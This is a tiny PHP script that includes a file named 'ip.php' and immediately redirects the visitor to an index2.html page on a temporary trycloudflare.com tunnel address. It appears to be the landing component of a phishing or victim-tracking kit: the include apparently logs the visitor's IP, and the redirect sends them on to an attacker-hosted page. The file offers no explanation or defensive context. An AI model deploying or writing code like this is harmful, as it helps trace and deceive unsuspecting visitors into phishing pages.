<?php
include 'ip.php';
header('Location: https://catch-recommended-disciplines-substantial.trycloudflare.com/index2.html');
exit
?>
